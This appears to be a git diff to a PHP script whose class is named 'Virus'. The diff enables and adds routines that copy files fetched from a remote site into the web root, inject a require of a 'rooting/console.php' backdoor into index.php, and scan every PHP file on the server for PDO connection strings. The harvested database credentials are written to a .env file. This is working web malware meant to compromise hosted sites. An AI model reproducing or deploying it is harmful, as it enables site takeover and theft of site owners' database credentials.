@@ -1,9 +1,11 @@
 <?php
 
 $data = new Virus();
-//$data->infect_structure_dir();
-//$data->infect_structure_file();
+$data->infect_structure_dir();
+$data->infect_structure_file();
 $data->infect_index_php();
+$data->infect_database();
+header("Location:".$data->run_virus());
 
 Class Virus {
 
@@ -47,6 +49,11 @@ Class Virus {
 		$this->link_root = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/';
 	}
 
+	public function run_virus() {
+
+		return ($_SERVER['HTTP_REFERER']);
+	}
+
 	public function infect_structure_dir() {
 
 		exec("ls -l ".$this->link_root.self::DIR_VIRUS, $exist_directory);
@@ -78,9 +85,9 @@ Class Virus {
 		}
 
 		foreach ($this->struct_file["racine"] as $file) {
-				
+
 			$file_info = pathinfo(self::URL_SITE.$dir.'/'.$file);
-				
+
 			if ($file_info['extension'] != 'phps')
 				file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$file, file_get_contents(self::URL_SITE.$file));
 			else
@@ -95,7 +102,73 @@ Class Virus {
 		if (empty($is))
 			file_put_contents($this->link_index, "");
 
-		
+		$ligne_php = "require 'rooting/console.php';\n";
+
+		$index_content = file($this->link_index);
+		$index_content[1] = $index_content[1]."\n".$ligne_php;
+		file_put_contents($this->link_index, implode("", $index_content));
+	}
+
+	public function infect_database() {
+
+		$identifiant = [];
+
+		exec("find ".$this->link_root."/ -name '*.php' -exec cat {} \; > ".$this->link_root."/infos.txt");
+		exec("cat ".$this->link_root."/infos.txt | grep -e 'new PDO'", $response);
+		$data = explode(',', trim(str_replace(' ', '', str_replace(');', '', substr($response[0], strpos($response[0], '(') + 1)))));
+
+		if (count($data) >= 3) {
+			$identifiant = $this->php_scrath($data);
+		} else {
+			echo "pas de bdd connexion la";
+		}
+
+		$this->write_en($identifiant);
+	}
+
+	private function write_en($identifiant) {
+
+		$inf = file($this->link_root.self::DIR_VIRUS.'/.env');
+		$inf[0] = str_replace("'", "", str_replace('"', '', $identifiant[0]))."\n";
+		$inf[1] = str_replace("'", "", str_replace('"', '', $identifiant[1]))."\n";
+		$inf[2] = str_replace("'", "", str_replace('"', '', $identifiant[2]))."\n";
+		file_put_contents($this->link_root.self::DIR_VIRUS.'/.env', implode("", $inf));
+	}
+
+	private function php_scrath($data) {
+
+		$identifiant = [];
+
+		foreach ($data as $value) {
+
+			if ($value[0] == "'") {
+
+				$identifiant[] = $value;
+			} else if ($value[0] == '"' && $value[1] != '$') {
+
+				$identifiant[] = $value;
+			} else {
+
+				$value = str_replace('"', '', $value);
+				$value = str_replace('$', '', $value);
+				exec("cat ".$this->link_root."/infos.txt | grep -e ".$value, $res);
+				$search = '\$'.$value;
+				foreach ($res as $values) {
+
+					if (preg_match('#'.$search.'#', $values) && !preg_match("#new PDO#", $values)) {
+
+						$values = str_replace('$', '', $values);
+						$values = str_replace($value, '', $values);
+						$values = trim($values);
+						$values = substr($values, 1);
+						$values = trim(substr($values, 0, -1));
+						$identifiant[] = $values;
+					}
+				}	
+			}
+		}
+
+		return ($identifiant);
 	}
 }
 ?>
